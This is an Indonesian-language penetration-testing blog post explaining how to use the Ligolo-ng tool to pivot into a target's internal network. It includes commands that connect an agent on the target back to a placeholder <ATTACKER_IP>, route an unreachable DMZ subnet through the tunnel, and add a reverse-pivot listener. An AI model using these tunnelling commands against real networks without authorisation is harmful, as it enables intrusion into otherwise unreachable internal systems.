---
title: Ligolo-NG - Pivoting Like a VPN
author: "novran"
date: 2024-11-23 00:00:00 +0700
categories: [Network Pentest]
tags: [Network Pentest]
mermaid: true
image:
  path: /images/2024-11-23-ligolo-pivoting-like-a-vpn-banner.png
  alt: Kerberoasting
---

Ligolo adalah alat open-source yang memungkinkan Kita untuk melakukan Pivoting dalam jaringan target. Dengan Ligolo, pengguna dapat mengakses jaringan internal target melalui tunnel terenkripsi tanpa perlu konfigurasi kompleks, hal ini tentunya terasa lebih seperti menggunakan VPN.

----------

## Installation

Terdapat 2 file yang perlu kalian Download di [Ligolo v0.6.2](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2).

1. `proxy` - file ini akan dijalankan di host kalian sendiri.
2. `agent` - file ini akan dijalankan di mesin target.

## Setup

**1. [Attacker Machine] Run the Proxy (as a Server)**

```bash
sudo ip tuntap add user xcho mode tun ligolo
sudo ip link set ligolo up
./proxy -laddr <ATTACKER_IP>:<ATTACKER_PORT> -selfcert
```

**2. [Target Machine] Run the Agent**

```powershell
.\agent.exe -connect <ATTACKER_IP>:<ATTACKER_PORT> -ignore-cert
```

**3. [Attacker Machine] Start Session in Ligolo Proxy**

```
>> session
>> start
```

**4. [Attacker Machine] Create a Network Route**

```
sudo ip route add <DMZ_NETWORK>/24 dev ligolo
```

> `<DMZ_NETWORK>` adalah Subnet yang tidak dapat dijangkau oleh mesin Attacker, contohnya `10.10.10.0/24`.

----------

## Cheatsheet

Reverse Pivoting

```
>> listener_add --addr 0.0.0.0:4433 --to 127.0.0.1:4433 --tcp
```
